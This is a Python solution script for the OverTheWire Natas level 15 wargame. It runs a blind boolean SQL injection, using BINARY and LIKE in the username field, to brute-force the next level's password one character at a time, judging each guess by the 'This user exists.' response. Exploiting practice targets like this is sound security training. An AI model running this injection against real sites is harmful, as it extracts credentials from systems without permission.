'''
This challenge is one SQL injection again. A complex one though.
'''
import requests
import re
import string

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits

username = "natas15"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

'''
index-source.html:
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/ 

We can see that there is a table called users and it has "username" and "password".
We can only insert username in the form.

The "query" from before doesn't change match:

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

So we can try to brute force the password through this SQL query this time.
'''

# Starting the bruteforcing of the password letter by letter
seen_password = list() # An empty list
# My malicious SQL command.
#I use "BINARY" because I want to know when the letter is uppecase or lowercase and I am using "LIKE" because I don't know the password and I am trying to find out throught this bruteforce technique.
sql_like_injection ='natas16" AND BINARY password LIKE"' # I know that "natas16" user exists so I have to find the password that he uses.
while(len(seen_password) != 32): # It stops when I get the password
	for character in chars:
		print("trying " + "".join(seen_password) + character)
		response = session.post(url,auth=(username,password),data={"username":sql_like_injection + "".join(seen_password) + character + '%"#'}) # POST request
		pageContent = response.text
		if re.findall("This user exists.",pageContent):
			seen_password.append(character) # Everytime I am getting the message "This user exists" means that I found a new letter from the password
			break
print("="*50)
print("\nThe password for the next level is: " + "".join(seen_password))
